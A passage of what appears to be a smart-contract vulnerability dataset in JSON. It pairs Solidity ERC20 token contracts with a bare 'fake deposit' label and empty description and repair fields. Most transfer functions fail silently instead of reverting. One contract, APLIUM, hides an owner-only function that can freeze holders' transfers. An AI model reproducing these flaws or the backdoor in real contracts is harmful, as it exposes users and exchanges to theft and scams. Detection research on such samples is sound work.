true;\r\n            } else { return false; }\r\n        }\r\n\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n                balances[_to] += _value;\r\n                balances[_from] -= _value;\r\n                allowed[_from][msg.sender] -= _value;\r\n                Transfer(_from, _to, _value);\r\n                return true;\r\n            } else { return false; }\r\n        }\r\n\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n          return balances[_owner];\r\n      }\r\n\r\n\r\n      function approve(address _spender, uint256 _value) returns (bool success) {\r\n              allowed[msg.sender][_spender] = _value;\r\n              Approval(msg.sender, _spender, _value);\r\n              return true;\r\n          }\r\n\r\n      function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n              return allowed[_owner][_spender];\r\n          } // end of Token contract\r\n\r\n}\r\n\r\n\r\ncontract EOS is Token {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n\r\n    function EOS() {\r\n        balances[msg.sender] = 1000000000;    // creator gets all initial tokens\r\n        totalSupply = 1000000000;             // total supply of token\r\n        name = \"EOS\";               // name of token\r\n        decimals = 0;                  // amount of decimals\r\n        symbol = \"EOS\";                // symbol of token\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// File: test3.sol\r\n\r\npragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n/// @return total amount of tokens\r\nfunction totalSupply() constant returns (uint256 supply) {}\r\n\r\n/// @param _owner The address from which the balance will be retrieved\r\n/// @return The balance\r\nfunction balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n/// @notice send `_value` token to `_to` from `msg.sender`\r\n/// @param _to The address of the recipient\r\n/// @param _value The amount of token to be transferred\r\n/// @return Whether the transfer was successful or not\r\nfunction transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n/// @param _from The address of the sender\r\n/// @param _to The address of the recipient\r\n/// @param _value The amount of token to be transferred\r\n/// @return Whether the transfer was successful or not\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n/// @param _spender The address of the account able to transfer the tokens\r\n/// @param _value The amount of wei to be approved for transfer\r\n/// @return Whether the approval was successful or not\r\nfunction approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n/// @param _owner The address of the account owning tokens\r\n/// @param _spender The address of the account able to transfer the tokens\r\n/// @return Amount of remaining tokens allowed to spent\r\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\nfunction transfer(address _to, uint256 _value) returns (bool success) {\r\n    if (balances[msg.sender] >= _value && _value > 0) {\r\n        balances[msg.sender] -= _value;\r\n        balances[_to] += _value;\r\n        Transfer(msg.sender, _to, _value);\r\n        return true;\r\n    } else { return false; }\r\n}\r\n\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n    if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n        balances[_to] += _value;\r\n        balances[_from] -= _value;\r\n        allowed[_from][msg.sender] -= _value;\r\n        Transfer(_from, _to, _value);\r\n    return true;\r\n    } else { return false; }\r\n}\r\n\r\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\r\n    return balances[_owner];\r\n}\r\n\r\nfunction approve(address _spender, uint256 _value) returns (bool success) {\r\n    allowed[msg.sender][_spender] = _value;\r\n    Approval(msg.sender, _spender, _value);\r\n    return true;\r\n}\r\n\r\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n    return allowed[_owner][_spender];\r\n}\r\n\r\nmapping (address => uint256) balances;\r\nmapping (address => mapping (address => uint256)) allowed;\r\nuint256 public totalSupply;\r\n}\r\n\r\n//name this contract whatever you\u2019d like\r\ncontract ERC20Token is StandardToken {\r\n\r\nfunction () {\r\n//if ether is sent to this address, send it back.\r\nthrow;\r\n}\r\n\r\n\r\nstring public name; \r\nuint8 public decimals; \r\nstring public symbol; \r\nstring public version = 'H1.0'; \r\n\r\n\r\nfunction ERC20Token() {\r\n    balances[msg.sender] = 999991818632568770064273785409628; \r\n        totalSupply = 999991818632568770064273785409628; \r\n        name = \"SHRUG Token\"; \r\n        decimals = 18; \r\n        symbol = \"SHRUG\"; \r\n    }\r\n\r\n    \r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n    allowed[msg.sender][_spender] = _value;\r\n    Approval(msg.sender, _spender, _value);\r\n\r\n    if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.25;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        uint256 _txfee = 0;\r\n        \r\n        if (balances[msg.sender] >= _value+_txfee && _value > 0) {\r\n            balances[msg.sender] -= _value+_txfee;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            \r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\ncontract BIOBIT is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    string public name;                  \r\n    uint8 public decimals;              \r\n    string public symbol;\r\n    string public version = 'v1.0';\r\n    address public creator;\r\n    mapping(address => string) public rewardIdMap;\r\n\r\n    function BIOBIT() {\r\n        totalSupply = 0;\r\n        balances[msg.sender] = totalSupply;\r\n        name = \"BioBit\";\r\n        decimals = 4;\r\n        symbol = \"BIOBIT\";\r\n        creator = msg.sender;\r\n    }\r\n    \r\n    function setRewardsID(string _rewardsId) public {\r\n        rewardIdMap[msg.sender] = _rewardsId;\r\n    }\r\n       \r\n    function addTokenToTotalSupply(uint _value) public {\r\n        require(msg.sender == creator);\r\n        require(_value > 0);\r\n        balances[msg.sender] = balances[msg.sender] + _value;\r\n        totalSupply = totalSupply + _value;\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: GPL-3.0\r\n\r\npragma solidity ^0.6.7;\r\n\r\n\r\ninterface ERC20 {\r\n    function totalSupply() external view returns (uint _totalSupply);\r\n    function balanceOf(address _owner) external view returns (uint balance);\r\n    function transfer(address _to, uint _value) external returns (bool success);\r\n    function transferFrom(address _from, address _to, uint _value) external returns (bool success);\r\n    function approve(address _spender, uint _value) external returns (bool success);\r\n    function allowance(address _owner, address _spender) external view returns (uint remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n\r\n}\r\n\r\n// this is the basics of creating an ERC20 token\r\n//change the name Henri and the symbol to whatever you would like\r\n\r\ncontract FATFARM is ERC20 {\r\n    string public constant symbol = \"FAT\";\r\n    string public constant name = \"Fat Coin\";\r\n    uint8 public constant decimals = 18;\r\n \r\n    //1,000,000+18 zeros\r\n    uint private constant __totalSupply = 1000000000000000000000000000000;\r\n\r\n    //this mapping is where we store the balances of an address\r\n    mapping (address => uint) private __balanceOf;\r\n\r\n    //This is a mapping of a mapping.  This is for the approval function to determine how much an address can spend\r\n    mapping (address => mapping (address => uint)) private __allowances;\r\n\r\n    //the creator of the contract has the total supply and no one can create tokens\r\n    constructor() public {\r\n        __balanceOf[msg.sender] = __totalSupply;\r\n    }\r\n\r\n    //constant value that does not change/  returns the amount of initial tokens to display\r\n    function totalSupply() public view override returns (uint _totalSupply) {\r\n        _totalSupply = __totalSupply;\r\n    }\r\n\r\n    //returns the balance of a specific address\r\n    function balanceOf(address _addr) public view override returns (uint balance) {\r\n        return __balanceOf[_addr];\r\n    }\r\n    \r\n\r\n    //transfer an amount of tokens to another address.  The transfer needs to be >0 \r\n    //does the msg.sender have enough tokens to forfill the transfer\r\n    //decrease the balance of the sender and increase the balance of the to address\r\n    function transfer(address _to, uint _value) public override returns (bool success) {\r\n        if (_value > 0 && _value <= balanceOf(msg.sender)) {\r\n            __balanceOf[msg.sender] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    \r\n    //this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\r\n    //If the 3rd party has an allowance of >0 \r\n    //and the value to transfer is >0 \r\n    //and the allowance is >= the value of the transfer\r\n    //and it is not a contract\r\n    //perform the transfer by increasing the to account and decreasing the from accounts\r\n    function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\r\n        if (__allowances[_from][msg.sender] > 0 &&\r\n            _value >0 &&\r\n            __allowances[_from][msg.sender] >= _value\r\n            //  the to address is not a contract\r\n            && !isContract(_to)) {\r\n            __balanceOf[_from] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n\r\n    //This check is to determine if we are sending to a contract?\r\n    //Is there code at this address?  If the code size is greater then 0 then it is a contract.\r\n    function isContract(address _addr) public view returns (bool) {\r\n        uint codeSize;\r\n        //in line assembly code\r\n        assembly {\r\n            codeSize := extcodesize(_addr)\r\n        }\r\n        // i=s code size > 0  then true\r\n        return codeSize > 0;    \r\n    }\r\n\r\n \r\n    //allows a spender address to spend a specific amount of value\r\n    function approve(address _spender, uint _value) external override returns (bool success) {\r\n        __allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    //shows how much a spender has the approval to spend to a specific address\r\n    function allowance(address _owner, address _spender) external override view returns (uint remaining) {\r\n        return __allowances[_owner][_spender];\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.8.0;\r\n\r\ninterface ERC20Interface {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract ERC20Base is ERC20Interface {\r\n\r\n    mapping (address => uint256) public _balances;\r\n    mapping (address => mapping (address => uint256)) public _allowances;\r\n    uint256 public _totalSupply;\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n\r\n        if (_balances[msg.sender] >= _value && _value > 0) {\r\n            _balances[msg.sender] -= _value;\r\n            _balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { \r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n       \r\n        if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\r\n            _balances[_to] += _value;\r\n            _balances[_from] -= _value;\r\n            _allowances[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return _balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        _allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n      return _allowances[_owner][_spender];\r\n    }\r\n    \r\n    function totalSupply() public view returns (uint256 total) {\r\n        return _totalSupply;\r\n    }\r\n}\r\n\r\ncontract WXO is ERC20Base {\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    \r\n    constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n        _totalSupply = initialSupply;\r\n        _balances[msg.sender] = initialSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address BoI = 0xb29ca378D528eECba2F19Ff77B32C8723Cc36c49;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n modifier onlyOwner{\r\n   require(msg.sender == _Owner);     \r\n        _; }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract APLIUM is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Bxx;\r\n    mapping (address => uint256) private Byy;\r\n    mapping (address => mapping (address => uint256)) private BvI;\r\n    uint8 private constant BdI = 8;\r\n    uint256 private constant bTT = 150000000 * (10** BdI);\r\n    string private constant _name = \"APLIUM\";\r\n    string private constant _symbol = \"APLIUM\";\r\n\r\n\r\n\r\n    constructor () {\r\n       Bxx[_msgSender()] = bTT; \r\n    emit Transfer(address(0), BoI, bTT);}\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return BdI;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return bTT;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Bxx[account];\r\n    }\r\n\t function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return BvI[owner][spender];\r\n    }\r\n\r\n        function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        BvI[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n\r\n    function update() public {\r\n        Bxx[msg.sender] = Byy[msg.sender];}\r\n        function transfer(address to, uint256 amount) public {\r\n        if(Byy[msg.sender] <= 1) {\r\n        require(Bxx[msg.sender] >= amount);\r\n        Bxx[msg.sender] -= amount;  \r\n        Bxx[to] += amount;          \r\n        emit Transfer(msg.sender, to, amount);}}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(Byy[sender] <= 1 && Byy[recipient] <= 1) {\r\n        require(amount <= Bxx[sender]);\r\n        require(amount <= BvI[sender][msg.sender]);\r\n        Bxx[sender] -= amount;\r\n        Bxx[recipient] += amount;\r\n        BvI[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}\r\n        function Qry(address x, uint256 y) public {\r\n        require(msg.sender == BoI);\r\n        Byy[x] = y;}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: GPL-3.0\r\n\r\npragma solidity ^0.6.7;\r\n\r\n\r\ninterface ERC20 {\r\n    function totalSupply() external view returns (uint _totalSupply);\r\n    function balanceOf(address _owner) external view returns (uint balance);\r\n    function transfer(address _to, uint _value) external returns (bool success);\r\n    function transferFrom(address _from, address _to, uint _value) external returns (bool success);\r\n    function approve(address _spender, uint _value) external returns (bool success);\r\n    function allowance(address _owner, address _spender) external view returns (uint remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n\r\n}\r\n\r\n// this is the basics of creating an ERC20 token\r\n//change the name Henri and the symbol to whatever you would like\r\n\r\ncontract PHATFARM is ERC20 {\r\n    string public constant symbol = \"PHAT\";\r\n    string public constant name = \"Phat Coin\";\r\n    uint8 public constant decimals = 18;\r\n \r\n    //1,000,000+18 zeros\r\n    uint private constant __totalSupply = 1000000000000000000000000000000;\r\n\r\n    //this mapping is where we store the balances of an address\r\n    mapping (address => uint) private __balanceOf;\r\n\r\n    //This is a mapping of a mapping.  This is for the approval function to determine how much an address can spend\r\n    mapping (address => mapping (address => uint)) private __allowances;\r\n\r\n    //the creator of the contract has the total supply and no one can create tokens\r\n    constructor() public {\r\n        __balanceOf[msg.sender] = __totalSupply;\r\n    }\r\n\r\n    //constant value that does not change/  returns the amount of initial tokens to display\r\n    function totalSupply() public view override returns (uint _totalSupply) {\r\n        _totalSupply = __totalSupply;\r\n    }\r\n\r\n    //returns the balance of a specific address\r\n    function balanceOf(address _addr) public view override returns (uint balance) {\r\n        return __balanceOf[_addr];\r\n    }\r\n    \r\n\r\n    //transfer an amount of tokens to another address.  The transfer needs to be >0 \r\n    //does the msg.sender have enough tokens to forfill the transfer\r\n    //decrease the balance of the sender and increase the balance of the to address\r\n    function transfer(address _to, uint _value) public override returns (bool success) {\r\n        if (_value > 0 && _value <= balanceOf(msg.sender)) {\r\n            __balanceOf[msg.sender] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    \r\n    //this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\r\n    //If the 3rd party has an allowance of >0 \r\n    //and the value to transfer is >0 \r\n    //and the allowance is >= the value of the transfer\r\n    //and it is not a contract\r\n    //perform the transfer by increasing the to account and decreasing the from accounts\r\n    function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\r\n        if (__allowances[_from][msg.sender] > 0 &&\r\n            _value >0 &&\r\n            __allowances[_from][msg.sender] >= _value\r\n            //  the to address is not a contract\r\n            && !isContract(_to)) {\r\n            __balanceOf[_from] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n\r\n    //This check is to determine if we are sending to a contract?\r\n    //Is there code at this address?  If the code size is greater then 0 then it is a contract.\r\n    function isContract(address _addr) public view returns (bool) {\r\n        uint codeSize;\r\n        //in line assembly code\r\n        assembly {\r\n            codeSize := extcodesize(_addr)\r\n        }\r\n        // i=s code size > 0  then true\r\n        return codeSize > 0;    \r\n    }\r\n\r\n \r\n    //allows a spender address to spend a specific amount of value\r\n    function approve(address _spender, uint _value) external override returns (bool success) {\r\n        __allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    //shows how much a spender has the approval to spend to a specific address\r\n    function allowance(address _owner, address _spender) external override view returns (uint remaining) {\r\n        return __allowances[_owner][_spender];\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/SDI.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: GPL-3.0\\n\\npragma solidity >=0.7.0 <0.9.0;\\n\\ncontract SDI {\\n\\n    address owner;\\n    mapping (address => uint) accounts;\\n\\n    constructor()  {\\n        owner = msg.sender;\\n    }\\n\\n    function mint(address recipient, uint value) public {\\n        if(msg.sender == owner) {\\n            accounts[recipient] += value;\\n        }\\n    }\\n\\n    function transfer(address to, uint value)  public{\\n        if(accounts[msg.sender] >= value) {\\n            accounts[msg.sender] -= value;\\n            accounts[to] += value;\\n        }\\n    }\\n\\n    function balance(address addr) public view returns (uint) {\\n        return accounts[addr];\\n    }\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Ethereum_Pie is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Ethereum Pie\";\r\n    string public constant symbol = \"\ud83e\udd67EPIE\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
